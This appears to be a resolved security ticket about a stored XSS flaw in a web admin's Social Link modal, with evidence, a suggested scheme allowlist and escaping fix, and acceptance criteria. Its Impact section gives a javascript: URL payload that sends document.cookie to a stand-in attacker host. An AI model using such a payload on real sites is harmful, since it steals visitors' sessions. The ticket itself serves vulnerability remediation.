---
id: T-008
title: Unsanitized href in Social Link modal allows stored XSS via javascript: URLs
status: done
severity: medium
area: admin
epic: E-001
created: 2026-07-19
---

## Summary

The admin "Social Link" content block accepts any URL string and renders
it as a real `href` on the public site with no scheme validation. A
`javascript:` URL saved through this modal executes in the browser of any
visitor who clicks the resulting link.

## Evidence

- `src/components/admin/SocialLinkModal.jsx:39-55` builds `href="${url}"` with no scheme allowlist. The `<input type="url">` HTML5 validation only checks URL *shape*, not scheme — `javascript:...` passes it.
- `src/components/markdown/MarkdownRenderer.jsx:23-31,52-66` regex-parses the `href` attribute back out of the saved block and passes it through unchanged.
- `src/components/ui/smoothui/rich-popover/index.tsx:139-148,163-173` renders `<a href={href} target="_blank" rel="noopener noreferrer">` — `rel="noopener noreferrer"` prevents tabnabbing but does nothing against a `javascript:` scheme executing on click.

## Impact

A malicious or compromised admin/contributor account inserts a Social
Link with URL `javascript:fetch('https://evil.example/x?c='+document.cookie)`
and saves the note. Any public site visitor who clicks the resulting
chip/button executes attacker-controlled JS in their browser — this
reaches the public site, not just the admin panel, and contributors
(a deliberately lower-trust tier per `allowed_directories`) can trigger it.

**Folded scope (formerly T-010):** in the same modal's save function,
`SocialLinkModal.jsx:43-51` escapes double quotes in `description` but
not in `title`, `url`, `meta`, or `actionLabel` before interpolating them
into the saved pseudo-JSX attribute string. A quote character in any of
those fields (e.g. a title like `Say "hi"`) breaks the generated
attribute syntax, and `MarkdownRenderer.jsx`'s `parseRichPopoverProps`
mis-splits subsequent attributes — silently corrupting the rendered
block. Not an XSS vector itself (the parsed values render as React text
children, which auto-escape), but it's a data-corruption bug in the exact
same interpolation code this ticket is already touching. Folded here
because fixing the scheme allowlist without also fixing the escaping
means touching these same lines twice.

## Suggested fix

- Validate the URL scheme when saving in `SocialLinkModal` (allowlist
  `https:`/`http:`/`mailto:`, reject everything else) and/or sanitize at
  render time in `MarkdownRenderer`/`rich-popover` before setting `href`
  — defense in depth means doing it in both places, not just the admin
  form.
- In the same pass, apply the same escaping already used for
  `description` to the other interpolated fields (`title`, `url`, `meta`,
  `actionLabel`) before building the saved block string.

## Acceptance criteria

- [x] Saving a Social Link with a `javascript:` (or `data:`, `vbscript:`) URL is rejected with a clear error, both in the admin form and at render time.
- [x] Existing valid `http(s)://`/`mailto:` links continue to work unchanged.
- [x] A title/url/meta/actionLabel containing a `"` character saves and renders correctly, without corrupting sibling attributes.

## References

- `src/components/markdown/MarkdownRenderer.jsx`
- `src/components/ui/smoothui/rich-popover/index.tsx`
- [T-010](T-010-social-link-modal-inconsistent-escaping.md) — folded into this ticket, same component/function
